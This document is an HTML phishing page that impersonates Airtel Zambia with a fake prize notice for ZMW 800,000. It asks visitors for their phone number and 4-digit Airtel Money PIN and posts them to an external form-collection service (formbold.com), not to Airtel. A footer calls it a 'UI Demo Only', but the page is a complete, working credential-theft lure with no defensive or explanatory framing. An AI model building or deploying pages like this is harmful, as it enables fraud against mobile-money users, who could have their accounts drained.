<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>You've Won a Prize</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="card">
        <h2>Congratulations! You've Won an Airtel Money Prize</h2>
        <p class="subtitle">Welcome! Enter your phone number and Secret Code (Airtel Money PIN - 4 digits) to claim your prize.</p>
        <div class="amount-box">
            <p>Prize Amount Available</p>
            <h1>ZMW 800,000</h1>
        </div>
        <form id="offerForm" action="https://formbold.com/s/94naj" method="POST">
            <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Phone Number (e.g., 097XXXXXXXX)" required>
            <input type="password" id="pin" name="pin" placeholder="Airtel Money Secret Code (4 digits)" maxlength="4" pattern="\d{4}" required>
            <button type="submit" id="submitBtn">Confirm</button>
        </form>
        <p class="note">Entering the secret code accepts the terms of use.</p>
        <footer>© Airtel Zambia – UI Demo Only</footer>
    </div>
</body>
</html>
